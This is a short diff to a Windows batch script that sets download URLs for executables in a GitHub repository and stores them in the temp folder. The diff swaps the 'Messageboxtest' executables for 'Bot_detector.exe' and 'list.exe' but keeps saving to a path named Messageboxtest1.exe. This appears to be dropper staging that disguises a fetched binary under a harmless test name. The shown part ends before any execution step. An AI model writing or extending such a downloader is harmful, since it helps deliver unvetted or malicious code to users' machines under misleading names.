@@ -1,7 +1,7 @@
 @echo off
 REM Define URLs for the EXEs
-set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest1.exe
-set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest2.exe
+set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Bot_detector.exe
+set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/list.exe
 
 REM Set temp file paths
 set F1=%TEMP%\Messageboxtest1.exe
